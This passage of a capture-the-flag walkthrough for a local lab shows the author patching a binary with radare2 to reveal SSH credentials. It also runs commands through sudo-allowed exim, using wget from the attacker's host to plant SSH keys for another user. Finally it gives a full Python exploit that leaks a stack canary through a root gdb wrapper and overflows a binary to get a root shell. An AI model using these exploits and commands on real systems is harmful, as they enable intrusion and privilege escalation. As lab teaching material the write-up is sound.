│           0x00001c78      4889c7         mov rdi, rax                ; char *s1
│           0x00001c7b      e880f4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001c80      488b155925..   mov rdx, qword [obj.QQQQ]   ; [0x41e0:8]=0x21f9
│           0x00001c87      488d85f0f7..   lea rax, [var_810h]
│           0x00001c8e      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001c91      4889c7         mov rdi, rax                ; char *s1
│           0x00001c94      e867f4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001c99      488d95f0fb..   lea rdx, [var_410h]
│           0x00001ca0      b800000000     mov eax, 0
│           0x00001ca5      b980000000     mov ecx, 0x80
│           0x00001caa      4889d7         mov rdi, rdx
│           0x00001cad      f348ab         rep stosq qword [rdi], rax
│           0x00001cb0      488b15f924..   mov rdx, qword [obj.NRG]    ; [0x41b0:8]=0x21e2 "cod"
│           0x00001cb7      488d85f0fb..   lea rax, [var_410h]
│           0x00001cbe      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001cc1      4889c7         mov rdi, rax                ; char *s1
│           0x00001cc4      e837f4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001cc9      488b15e824..   mov rdx, qword [obj.BRZL]   ; [0x41b8:8]=0x21e6 "igo"
│           0x00001cd0      488d85f0fb..   lea rax, [var_410h]
│           0x00001cd7      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001cda      4889c7         mov rdi, rax                ; char *s1
│           0x00001cdd      e81ef4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001ce2      488d85f0fb..   lea rax, [var_410h]
│           0x00001ce9      4889c7         mov rdi, rax                ; const char *s
│           0x00001cec      e86ff3ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00001cf1      4889c2         mov rdx, rax
│           0x00001cf4      488d85f0fb..   lea rax, [var_410h]
│           0x00001cfb      4801d0         add rax, rdx
│           0x00001cfe      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00001d03      488b15b624..   mov rdx, qword [obj.LAKDF]  ; [0x41c0:8]=0x21ea "de"
│           0x00001d0a      488d85f0fb..   lea rax, [var_410h]
│           0x00001d11      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001d14      4889c7         mov rdi, rax                ; char *s1
│           0x00001d17      e8e4f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001d1c      488d85f0fb..   lea rax, [var_410h]
│           0x00001d23      4889c7         mov rdi, rax                ; const char *s
│           0x00001d26      e835f3ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00001d2b      4889c2         mov rdx, rax
│           0x00001d2e      488d85f0fb..   lea rax, [var_410h]
│           0x00001d35      4801d0         add rax, rdx
│           0x00001d38      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00001d3d      488b158424..   mov rdx, qword [obj.WVWVEB] ; [0x41c8:8]=0x21ed "seg"
│           0x00001d44      488d85f0fb..   lea rax, [var_410h]
│           0x00001d4b      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001d4e      4889c7         mov rdi, rax                ; char *s1
│           0x00001d51      e8aaf3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001d56      488b157324..   mov rdx, qword [obj.RBWRTB] ; [0x41d0:8]=0x21f1 "uri"
│           0x00001d5d      488d85f0fb..   lea rax, [var_410h]
│           0x00001d64      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001d67      4889c7         mov rdi, rax                ; char *s1
│           0x00001d6a      e891f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001d6f      488b156224..   mov rdx, qword [obj.AEBDV]  ; [0x41d8:8]=0x21f5 "dad"
│           0x00001d76      488d85f0fb..   lea rax, [var_410h]
│           0x00001d7d      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001d80      4889c7         mov rdi, rax                ; char *s1
│           0x00001d83      e878f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001d88      488d85f0fb..   lea rax, [var_410h]
│           0x00001d8f      4889c7         mov rdi, rax                ; const char *s
│           0x00001d92      e8c9f2ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00001d97      4889c2         mov rdx, rax
│           0x00001d9a      488d85f0fb..   lea rax, [var_410h]
│           0x00001da1      4801d0         add rax, rdx
│           0x00001da4      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00001da9      488b15e023..   mov rdx, qword [obj.VNZ]    ; [0x4190:8]=0x21d4
│           0x00001db0      488d85f0fb..   lea rax, [var_410h]
│           0x00001db7      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001dba      4889c7         mov rdi, rax                ; char *s1
│           0x00001dbd      e83ef3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001dc2      488b15cf23..   mov rdx, qword [obj.HK]     ; [0x4198:8]=0x21d6 str.ncor
│           0x00001dc9      488d85f0fb..   lea rax, [var_410h]
│           0x00001dd0      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001dd3      4889c7         mov rdi, rax                ; char *s1
│           0x00001dd6      e825f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001ddb      488b15be23..   mov rdx, qword [obj.EEUU]   ; [0x41a0:8]=0x21db "re"
│           0x00001de2      488d85f0fb..   lea rax, [var_410h]
│           0x00001de9      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001dec      4889c7         mov rdi, rax                ; char *s1
│           0x00001def      e80cf3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001df4      488b150d24..   mov rdx, qword [obj.ASMQXZ] ; [0x4208:8]=0x2205
│           0x00001dfb      488d85f0fb..   lea rax, [var_410h]
│           0x00001e02      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001e05      4889c7         mov rdi, rax                ; char *s1
│           0x00001e08      e8f3f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001e0d      488b15dc23..   mov rdx, qword [obj.POIKJ]  ; [0x41f0:8]=0x21fe
│           0x00001e14      488d85f0fb..   lea rax, [var_410h]
│           0x00001e1b      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001e1e      4889c7         mov rdi, rax                ; char *s1
│           0x00001e21      e8daf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001e26      488b15bb23..   mov rdx, qword [obj.ERTG]   ; [0x41e8:8]=0x21fc
│           0x00001e2d      488d85f0fb..   lea rax, [var_410h]
│           0x00001e34      4889d6         mov rsi, rdx                ; const char *s2
│           0x00001e37      4889c7         mov rdi, rax                ; char *s1
│           0x00001e3a      e8c1f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00001e3f      488d85f0ef..   lea rax, [format]
│           0x00001e46      4889c7         mov rdi, rax                ; const char *format
│           0x00001e49      b800000000     mov eax, 0
│           0x00001e4e      e8ddf1ffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00001e53      488d8510ef..   lea rax, [var_10f0h]
│           0x00001e5a      4889c6         mov rsi, rax
│           0x00001e5d      488d05a503..   lea rax, [0x00002209]       ; "%s"
│           0x00001e64      4889c7         mov rdi, rax                ; const char *format
│           0x00001e67      b800000000     mov eax, 0
│           0x00001e6c      e84ff2ffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00001e71      488d8510ef..   lea rax, [var_10f0h]
│           0x00001e78      4889c7         mov rdi, rax                ; char *arg1
│           0x00001e7b      e869f5ffff     call sym.b6v4c8
│           0x00001e80      85c0           test eax, eax
│       ┌─< 0x00001e82      751b           jne 0x1e9f
│       │   0x00001e84      488d85f0f3..   lea rax, [s]
│       │   0x00001e8b      4889c7         mov rdi, rax                ; const char *format
│       │   0x00001e8e      b800000000     mov eax, 0
│       │   0x00001e93      e898f1ffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x00001e98      b801000000     mov eax, 1
│      ┌──< 0x00001e9d      eb6f           jmp 0x1f0e
│      ││   ; CODE XREF from main @ 0x1e82(x)
│      │└─> 0x00001e9f      488d85f0f7..   lea rax, [var_810h]
│      │    0x00001ea6      4889c7         mov rdi, rax                ; const char *format
│      │    0x00001ea9      b800000000     mov eax, 0
│      │    0x00001eae      e87df1ffff     call sym.imp.printf         ; int printf(const char *format)
│      │    0x00001eb3      488d8580ef..   lea rax, [var_1080h]
│      │    0x00001eba      4889c6         mov rsi, rax
│      │    0x00001ebd      488d054503..   lea rax, [0x00002209]       ; "%s"
│      │    0x00001ec4      4889c7         mov rdi, rax                ; const char *format
│      │    0x00001ec7      b800000000     mov eax, 0
│      │    0x00001ecc      e8eff1ffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│      │    0x00001ed1      488d8580ef..   lea rax, [var_1080h]
│      │    0x00001ed8      4889c7         mov rdi, rax                ; char *arg1
│      │    0x00001edb      e894f5ffff     call sym.x1w5z9
│      │    0x00001ee0      85c0           test eax, eax
│      │┌─< 0x00001ee2      751b           jne 0x1eff
│      ││   0x00001ee4      488d85f0fb..   lea rax, [var_410h]
│      ││   0x00001eeb      4889c7         mov rdi, rax                ; const char *format
│      ││   0x00001eee      b800000000     mov eax, 0
│      ││   0x00001ef3      e838f1ffff     call sym.imp.printf         ; int printf(const char *format)
│      ││   0x00001ef8      b801000000     mov eax, 1
│     ┌───< 0x00001efd      eb0f           jmp 0x1f0e
│     │││   ; CODE XREF from main @ 0x1ee2(x)
│     ││└─> 0x00001eff      b800000000     mov eax, 0
│     ││    0x00001f04      e8f6f5ffff     call sym.k8j4h3
│     ││    0x00001f09      b800000000     mov eax, 0
│     ││    ; CODE XREFS from main @ 0x1e9d(x), 0x1efd(x)
│     └└──> 0x00001f0e      488b55f8       mov rdx, qword [canary]
│           0x00001f12      64482b1425..   sub rdx, qword fs:[0x28]
│       ┌─< 0x00001f1b      7405           je 0x1f22
│       │   0x00001f1d      e88ef1ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0x1f1b(x)
│       └─> 0x00001f22      c9             leave
└           0x00001f23      c3             ret
[0x00001865]> 
```
After opening the binary "sec2pass" with radare2 "r2" in read mode "-w", we launch the command `aaa` to analyze the binary, then we position ourselves in `main()` by executing
`s main` and then we decompile the function with `pdf`, here in the decompiled code of `main` we will locate the first `CALL` instruction and its following instruction

```
│           0x000018aa      e851f8ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000018af      488b159a28..   mov rdx, qword [obj.PRZS]   ; [0x4150:8]=0x21b9
```

We have the address of the first `CALL` instruction = "0x000018aa" and the address of the next instruction = "0x000018af"
Now I need the address of the function I want to call, that is, the address of the `k8j4h3()` function. To locate it, we execute

```
is~k8j4h3
```
```
53  0x000014ff 0x000014ff GLOBAL FUNC   870      k8j4h3
```

So we already have the address which is `0x000014ff`

What I need now is to calculate the offset from the `k8j4h3` function to the address `0x000018af`

calculating displacement and direction based on 2

```
desp= function_dest (k8j4h3) - siguiente_direccion (0x000018af) = 0x000014ff - 0x000018af = -0x3b0
```
We take the absolute value `0x3b0` and convert it to binary

```
0x3b0 = 0011 1011 0000
```
Now we invert the bits and add +1

```
1100 0100 1111 + 1 = 1100 0101 0000
```

We convert this result to hexadecimal

```bash
echo "ibase=2; 110001010000" | bc | xargs printf '%x\n'
```
```
c50
```

At this point we have almost everything ready, now we need to fill with `f's` on the left to complete 4 bytes:

```
ff ff fc 50
```
We convert it to little-endia format and add the CALL instruction in `asm` at the beginning.

```
e8 50 fc ff ff
```

e8 = instruccion `CALL`

We just need to rewrite the address where the first `CALL` instruction is located, i.e. `0x000018aa` with `e850fcffff`, so we go to the address
an overwrite

```
[0x00001865]> s 0x000018aa
[0x000018aa]> wx e850fcffff
[0x000018aa]> pd 1 @ 0x000018aa
```
the last command should return us:

```
│           0x000018aa      e850fcffff     call sym.k8j4h3
```

which would be confirmation that we have correctly written the address `0x000018aa` to call the `k8j4h3()` function, all that remains is to save the changes and exit, for that we send the `quit` command and then execute the `sec2pass` binary, if everything went correctly, it should look like this:

![image](https://github.com/user-attachments/assets/63fae286-4fef-4d26-930c-404a799e33ea)

We see that we've successfully cracked the program by extracting the credentials. If we recall the `nmap` report, we had the `SSH` service running, so after testing the program's credentials, we were able to gain access...!!!

![image](https://github.com/user-attachments/assets/7744a944-1d19-4d25-b116-897c911baf00)

# Lateral Movement (optional)

## carlos

read the flag

```bash
cat user.txt
d784fa8b6d98d27699781bd9a7cf19f0
```

This user can run the `exim` program as the user `pedro`

![image](https://github.com/user-attachments/assets/ffdf87f1-ffb8-408d-bb17-b094c653bf71)

The problem was that I couldn't find a way to abuse this program to scale, until I decided to look for information in its own documentation.

![image](https://github.com/user-attachments/assets/c36eab47-a80c-4a70-8ca3-e10dac531060)

I found a way to run commands

```bash
sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "whoami;id"}}'
```

![image](https://github.com/user-attachments/assets/fc83b025-d80f-4ae1-b738-cbf6a07d9599)

But from here I can't get a bash directly as `pedro`, so I'm going to try to gain access via `ssh` by implanting a key pair in `/home/pedro/.ssh` that I'm going to generate on my attacking machine.

```
ssh-keygen -t rsa -b 4096
```
```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/darks/.ssh/id_rsa): 
/home/darks/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase for "/home/darks/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/darks/.ssh/id_rsa
Your public key has been saved in /home/darks/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:qHvT6jODrldXJVOd5CnbodHQakdcTFijwrGHZJE/kdw darks@Darks
The key's randomart image is:
+---[RSA 4096]----+
|           **=+O+|
|          *.=BOEo|
|           O+=*  |
|       .  . =O.. |
|      . S. .o.o  |
|     .. .        |
|    .o o         |
|    o.* .        |
|  .+ooo*         |
+----[SHA256]-----+
```

With the following command, we will copy the created keys to our current directory, then make a copy of `id_rsa.pub` with the name `authorized_keys`
With this, we will have 3 final files: id_rsa.pub, authorized_keys & id_rsa

```
cp /home/darks/.ssh/id_rsa . && cp /home/darks/.ssh/id_rsa.pub . && cp id_rsa.pub authorized_keys
```

Next, upload the `authorized_keys` and `id_rsa.pub` files to `/home/pedro/.ssh`. To do this, I set up a Python server on my machine.

```bash
python3 -m http.server 80
```

Now download the keys to the user Pedro's directory with the following commands

```bash
sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "wget http://172.17.0.1/authorized_keys -O /home/pedro/.ssh/authorized_keys"}}'
```

```bash
sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "wget http://172.17.0.1/id_rsa.pub -O /home/pedro/.ssh/id_rsa.pub"}}'
```

Finally we validate that the files are where they should be with the command

```bash
sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "ls -la /home/pedro/.ssh/"}}'
```
```bash
total 16
drwx------ 2 pedro pedro 4096 Mar 12 22:58 .
drwx------ 1 pedro pedro 4096 Mar 12 22:45 ..
-rw------- 1 pedro pedro  737 Mar 12 22:54 authorized_keys
-rw------- 1 pedro pedro  737 Mar 12 22:54 id_rsa.pub
```
Everything is ready, just gain access via `ssh`

```bash
ssh -i id_rsa pedro@172.17.0.2
```

# Privilege Escalation

## pedro

In this user's directory there are 2 files, a "hall" program and an email

mail
```
Pedro, the hall binary was found by the Inter Corp administrators and they expect you to analyze it. 
I have enabled gdb '/usr/local/bin/secure_gdb' so that if necessary you can debug it as root and, 
for security reasons, you know that I limit functions in the debugger to avoid problems.
```
According to the email, they have enabled gdb to be used with sudo through the script `/usr/local/bin/secure_gdb`

![image](https://github.com/user-attachments/assets/f5e57f92-a031-4dcd-b0f3-c14d28bfc487)

I'll try to overlook this.

![image](https://github.com/user-attachments/assets/c1f8ef38-431d-4dc7-b691-1e35ccbc4274)

It seems that externally I can't do anything other than run the indicated binary, so I will try to run commands internally in `gdb`

![image](https://github.com/user-attachments/assets/27001625-9dae-4bc5-9b06-f48eba692058)

They have disabled command execution within `gdb`, so it seems that it will not be possible to inject commands via this route and escalate to root, so now I will focus on the `hall` binary.

![image](https://github.com/user-attachments/assets/e9baf55e-e94b-4a2b-8e88-fb1d566e73a0)

This seems to be the normal behavior of the binary, now test if it is vulnerable to bof

![image](https://github.com/user-attachments/assets/969e16f0-d8d5-4287-b093-87734cbe54e6)

It is vulnerable to BOF, and from the message that is observed and highlighted, the binary has active canary protection, so let's check the protections present, but for that, I pass it to my attacking machine.

```bash
scp -i id_rsa pedro@172.17.0.2:/home/pedro/hall .
```
The previous command transfers the hall binary to our attacking machine, now it checks the protections

![image](https://github.com/user-attachments/assets/ec61bdfc-3cf0-463f-8d1b-622c0b3979de)

It has all the protections active, now I open it with Ghidra to analyze it internally

![image](https://github.com/user-attachments/assets/ce396305-cdcc-4265-a984-71be5acff990)

First, I noticed a large number of functions that are never called in the program. After reviewing them all, I found the intel() function and its contents. It caught my attention. It runs commands as root, leaving the system vulnerable, and then launches a `/bin/bash`. I also found another function: factor1().

![image](https://github.com/user-attachments/assets/cf962d52-bc14-4682-80e0-2a79cbb4358c)

This function also tries to execute a shell, but this function does not use `system`, but rather uses `execve` along with a `/bin/sh`, this also seems of interest since `execve` and `sh` are ideal for having greater control over environments that may be corrupt, whereas `system` and `/bin/bash` are more restrictive and can fail very easily in corrupt environments, perhaps this is the reason for the `factor1` function, due to possible corruption... the idea here will be to try to redirect the program flow to one of the 2 functions, either `intel()` or `factor1`. We run the binary with the debugger to analyze it

```bash
gdb ./hall -q
(gdb) break main          # creamos un punto de interrupcion en main
(gdb) run                 # corremos el programa para que se detenga en main
(gdb) disassemble main    # desensamblamos la funcion main
```
```bash
Dump of assembler code for function main:
   0x00005555555561fc <+0>:	push   %rbp
   0x00005555555561fd <+1>:	mov    %rsp,%rbp
=> 0x0000555555556200 <+4>:	sub    $0x50,%rsp
   0x0000555555556204 <+8>:	mov    %fs:0x28,%rax
   0x000055555555620d <+17>:	mov    %rax,-0x8(%rbp)
   0x0000555555556211 <+21>:	xor    %eax,%eax
   0x0000555555556213 <+23>:	lea    0x14a6(%rip),%rax        # 0x5555555576c0
   0x000055555555621a <+30>:	mov    %rax,%rdi
   0x000055555555621d <+33>:	call   0x555555555040 <puts@plt>
   0x0000555555556222 <+38>:	mov    $0x0,%eax
   0x0000555555556227 <+43>:	call   0x555555556117 <factor2>
   0x000055555555622c <+48>:	lea    0x14bd(%rip),%rax        # 0x5555555576f0
   0x0000555555556233 <+55>:	mov    %rax,%rdi
   0x0000555555556236 <+58>:	mov    $0x0,%eax
   0x000055555555623b <+63>:	call   0x555555555030 <printf@plt>
   0x0000555555556240 <+68>:	lea    -0xc(%rbp),%rax
   0x0000555555556244 <+72>:	mov    %rax,%rsi
   0x0000555555556247 <+75>:	lea    0x14d5(%rip),%rax        # 0x555555557723
   0x000055555555624e <+82>:	mov    %rax,%rdi
   0x0000555555556251 <+85>:	mov    $0x0,%eax
   0x0000555555556256 <+90>:	call   0x555555555170 <__isoc99_scanf@plt>
   0x000055555555625b <+95>:	lea    -0xc(%rbp),%rax
   0x000055555555625f <+99>:	lea    0x14c1(%rip),%rdx        # 0x555555557727
   0x0000555555556266 <+106>:	mov    %rdx,%rsi
   0x0000555555556269 <+109>:	mov    %rax,%rdi
   0x000055555555626c <+112>:	call   0x555555555140 <strcmp@plt>
   0x0000555555556271 <+117>:	test   %eax,%eax
   0x0000555555556273 <+119>:	jne    0x555555556286 <main+138>
   0x0000555555556275 <+121>:	lea    0x14b4(%rip),%rax        # 0x555555557730
   0x000055555555627c <+128>:	mov    %rax,%rdi
   0x000055555555627f <+131>:	call   0x555555555040 <puts@plt>
   0x0000555555556284 <+136>:	jmp    0x555555556295 <main+153>
   0x0000555555556286 <+138>:	lea    0x14e3(%rip),%rax        # 0x555555557770
   0x000055555555628d <+145>:	mov    %rax,%rdi
   0x0000555555556290 <+148>:	call   0x555555555040 <puts@plt>
--Type <RET> for more, q to quit, c to continue without paging--
   0x0000555555556295 <+153>:	movl   $0x46,-0x44(%rbp)
   0x000055555555629c <+160>:	cmpl   $0x4e,-0x44(%rbp)
   0x00005555555562a0 <+164>:	jne    0x555555556317 <main+283>
   0x00005555555562a2 <+166>:	lea    0x1518(%rip),%rax        # 0x5555555577c1
   0x00005555555562a9 <+173>:	mov    %rax,-0x40(%rbp)
   0x00005555555562ad <+177>:	lea    0x151d(%rip),%rax        # 0x5555555577d1
   0x00005555555562b4 <+184>:	mov    %rax,-0x38(%rbp)
   0x00005555555562b8 <+188>:	lea    0x1522(%rip),%rax        # 0x5555555577e1
   0x00005555555562bf <+195>:	mov    %rax,-0x30(%rbp)
   0x00005555555562c3 <+199>:	lea    0x1529(%rip),%rax        # 0x5555555577f3
   0x00005555555562ca <+206>:	mov    %rax,-0x28(%rbp)
   0x00005555555562ce <+210>:	lea    0x152f(%rip),%rax        # 0x555555557804
   0x00005555555562d5 <+217>:	mov    %rax,-0x20(%rbp)
   0x00005555555562d9 <+221>:	lea    0x1532(%rip),%rax        # 0x555555557812
   0x00005555555562e0 <+228>:	mov    %rax,-0x18(%rbp)
   0x00005555555562e4 <+232>:	movl   $0x0,-0x48(%rbp)
   0x00005555555562eb <+239>:	jmp    0x55555555630d <main+273>
   0x00005555555562ed <+241>:	mov    -0x48(%rbp),%eax
   0x00005555555562f0 <+244>:	cltq
   0x00005555555562f2 <+246>:	mov    -0x40(%rbp,%rax,8),%rax
   0x00005555555562f7 <+251>:	mov    %rax,%rdi
   0x00005555555562fa <+254>:	call   0x555555555417 <process_string>
   0x00005555555562ff <+259>:	mov    $0xa,%edi
   0x0000555555556304 <+264>:	call   0x555555555060 <putchar@plt>
   0x0000555555556309 <+269>:	addl   $0x1,-0x48(%rbp)
   0x000055555555630d <+273>:	mov    -0x48(%rbp),%eax
   0x0000555555556310 <+276>:	cmp    $0x5,%eax
   0x0000555555556313 <+279>:	jbe    0x5555555562ed <main+241>
   0x0000555555556315 <+281>:	jmp    0x555555556321 <main+293>
   0x0000555555556317 <+283>:	mov    $0xa,%edi
   0x000055555555631c <+288>:	call   0x555555555060 <putchar@plt>
   0x0000555555556321 <+293>:	mov    $0x0,%eax
   0x0000555555556326 <+298>:	mov    -0x8(%rbp),%rdx
   0x000055555555632a <+302>:	sub    %fs:0x28,%rdx
   0x0000555555556333 <+311>:	je     0x55555555633a <main+318>
   0x0000555555556335 <+313>:	call   0x555555555130 <__stack_chk_fail@plt>
--Type <RET> for more, q to quit, c to continue without paging--
   0x000055555555633a <+318>:	leave
   0x000055555555633b <+319>:	ret
```
we can immediately see where the `canary` is located

```
0x000055555555620d <+17>:	mov    %rax,-0x8(%rbp)
```

With `stepi` we move forward until after the canary

![image](https://github.com/user-attachments/assets/67f091d2-682e-4856-9e40-a72e8a1daad5)

We moved 4 memory addresses, and the canary is now located at `rbp - 0x8` so we can query it.

```bash
(gdb) x/1gx $rbp-0x8
```

![image](https://github.com/user-attachments/assets/ab3747e1-f122-4258-b057-c4699a73e990)

We already know how to extract the canary, now to extract the address of factor1(), which will be the first one I will try, we use the command

```bash
(gdb) p factor1
```
```
$1 = {<text variable, no debug info>} 0x5555555560b7 <factor1>
```

Now we validate the offset of the vulnerable input to know the size of the buffer before reaching the canary

![image](https://github.com/user-attachments/assets/a0baaca2-641d-46ad-bdef-f83eb0420f41)

The offset is 72 bytes, so this data will be useful for building the exploit.

we already know how to extract the address of a function, we already have the offset to the canary, we also know where the canary is located and how to extract it, this would be all the information that we need to extract at runtime since due to active protections, the memory addresses are randomized after each execution, for this reason we are going to develop the exploit to interact with `gdb`, well we must take into account that if instead of pointing to gdb directly, I point to the script `/usr/local/bin/secure_gdb` I could execute gdb as root, so the binary inherits the permissions and runs as root, and if the exploit works, I would be obtaining a shell as root directly, so in the exploit I point to the script to execute gdb as root.

I developed the exploit to interact with gdb through the script "/usr/local/bin/secure_gdb" and in the same way that I extracted the information manually in gdb, I do it but automating the entire process and using regular expressions to extract the data I need at runtime, the exploit looks like this:

exploit.py
```python
import pexpect
import re
import struct
from pwn import *
def atack():
    # 4 espacios de identacion
    binary = ELF("/home/pedro/hall")
    binary_path = "/home/pedro/hall"
    gdb_path = "/usr/local/bin/secure_gdb"
    gdb_process = pexpect.spawn(f"sudo {gdb_path} {binary_path}", timeout=10, maxread=10000, searchwindowsize=100)
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set disassembly-flavor intel")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set pagination off")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("set style enabled off")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("break main")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("run")


    # Extraccion direccion de funcion   factor1()
    gdb_process.expect("(gdb)")
    gdb_process.sendline("p factor1")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_factor1 = gdb_process.before.decode('utf-8')
    match = re.search(r'0x[0-9a-f]+', address_factor1)
    if match:
       address_factor1_str = match.group(0)  # Extraer la dirección en formato hexadecimal
       address_factor1_int = int(address_factor1_str, 16)
       address_factor1_le = p64(address_factor1_int) # direccion de factor1 en formato little-endian lista para el payload
       gdb_process.sendline(" ") # prepara gdb para recibir el siguiente comando!
    else:
       print("No se pudo extraer la dirección de factor1().")
       exit(1)

    # extraemos la direccion de memoria que nos permitira crear un breakpoint para capturar el canary ya cargado en el stack
    gdb_process.expect("(gdb)")
    gdb_process.sendline("disas factor2")
    gdb_process.expect_exact("(gdb)", timeout=10)
    address_factor2 = gdb_process.before.decode('utf-8')
    lines = address_factor2.splitlines()
    memory_addresses = [line.split()[0] for line in lines if '<+' in line]
    if len(memory_addresses) >= 7:
       seventh_memory_address = memory_addresses[6]
       gdb_process.sendline(" ")
       gdb_process.expect("(gdb)")
       gdb_process.sendline(f"break *{seventh_memory_address}")
       gdb_process.expect("(gdb)")
       gdb_process.sendline("continue")
    else:
       print("No hay suficientes direcciones de memoria en la salida")

    # calculamos el Canary
    gdb_process.expect("(gdb)")
    gdb_process.sendline("x/1gx $rbp-0x8")
    gdb_process.expect_exact("(gdb)", timeout=10)
    output_canary = gdb_process.before.decode('utf-8')
    canary_value = output_canary.split(':')[1].strip().split()[0]
    output_canary_int = int(canary_value, 16)
    output_canary_le = struct.pack('<Q', output_canary_int) # canary listo en formato little-endian para el payload
    gdb_process.sendline(" ")
    gdb_process.expect("(gdb)")
    gdb_process.sendline("continue")

#    codigo temporal para calcular en que punto se sobrescribe el rip
#    gdb_process.expect("(gdb)")
#    gdb_process.sendline("disas factor2")
#    gdb_process.expect_exact("(gdb)", timeout=10)
#    address_breakpoint = gdb_process.before.decode('utf-8')
#    lines = address_breakpoint.splitlines()
#    memory_addresses_breakpoint = [line.split()[0] for line in lines if '<+' in line]
#    if len(memory_addresses_breakpoint) >= 20:
#       memory_address_bp = memory_addresses_breakpoint[19]
#       gdb_process.sendline(" ")
#       gdb_process.expect("(gdb)")
#       gdb_process.sendline(f"break *{memory_address_bp}")
#       gdb_process.expect("(gdb)")
#       gdb_process.sendline("continue")
#    else:
#       print("No hay suficientes direcciones de memoria en la salida")

    # construccion del payload
    buffer_size = 72 # desplazamiento hasta el canary
    buffer_fil = b'S' *buffer_size
    padding = b'A' *8 # relleno para alinear la pila

    payload = flat(
    buffer_fil,
    output_canary_le,
    padding,
    address_factor1_le
    )
    # Enviar el payload
    gdb_process.expect("Introduce tu nombre: ")
    gdb_process.sendline(payload)
    gdb_process.interact()
    gdb_process.send(b"quit")
    gdb_process.close()

if __name__ == '__main__':
    atack()
```
Once the exploit is developed, we proceed to test it.

![image](https://github.com/user-attachments/assets/171ec9c2-a5a4-4523-83a3-9a73bdc3b753)

As you can see, the exploit can fail and this happens because it works with random memory addresses that could cause conflicts in the reception or sending of the payload, but if we try again we see that it was successfully executed, obtaining a terminal as root, but this terminal turns out to be very uncomfortable, so I will edit the "/etc/passwd" file.

![image](https://github.com/user-attachments/assets/5f2a54b3-8afa-4e70-96e4-0b1b4f14f407)


![image](https://github.com/user-attachments/assets/d2b9e5b7-40ed-411d-b2e5-41d1b72b0b6e)

![image](https://github.com/user-attachments/assets/ccf573f1-ab9b-43a3-8b3d-f4cead486845)

I get a better terminal as root and read its flag

```bash
cat /root/root.txt
592d328555681ed9a01b836acd8fea34
```

